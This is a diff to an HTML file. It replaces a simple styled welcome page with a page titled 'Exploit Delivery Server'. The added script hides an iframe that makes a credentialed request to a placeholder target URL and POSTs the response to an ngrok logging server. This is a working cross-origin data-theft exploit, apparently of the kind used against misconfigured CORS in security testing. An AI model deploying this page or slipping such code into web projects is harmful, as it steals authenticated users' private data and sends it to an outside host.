@@ -1,30 +1,39 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Welcome Page</title>
-    <style>
-        body {
-            /* Cool gradient background */
-            background: linear-gradient(135deg, #6a11cb, #2575fc);
-            height: 100vh;
-            display: flex;
-            justify-content: center;
-            align-items: center;
-            margin: 0;
-            font-family: Arial, sans-serif;
-            color: white;
-            text-align: center;
-        }
-
-        h1 {
-            font-size: 3em;
-            text-shadow: 2px 2px 8px rgba(0,0,0,0.3);
-        }
-    </style>
+<meta charset="UTF-8">
+<title>Exploit Delivery Server</title>
 </head>
 <body>
-    <h1>Hello! Welcome to my page</h1>
+<h1>Exploit Delivery Server</h1>
+
+<script>
+// Target page to test
+const targetUrl = "YOUR_TARGET_URL";
+
+// Send response to your ngrok logging server
+const logServer = "NGROK_URL/log";
+
+// Create iframe to fetch data from target
+const iframe = document.createElement('iframe');
+iframe.style.display = 'none';
+
+iframe.srcdoc = '<script>' +
+'var req = new XMLHttpRequest();' +
+'req.onload = function() {' +
+'  fetch("' + logServer + '", {' +
+'    method: "POST",' +
+'    headers: {"Content-Type":"application/json"},' +
+'    body: JSON.stringify({key: this.responseText})' +
+'  });' +
+'};' +
+'req.open("GET", "' + targetUrl + '", true);' +
+'req.withCredentials = true;' +
+'req.send();' +
+'<\/script>';
+
+document.body.appendChild(iframe);
+</script>
+
 </body>
 </html>
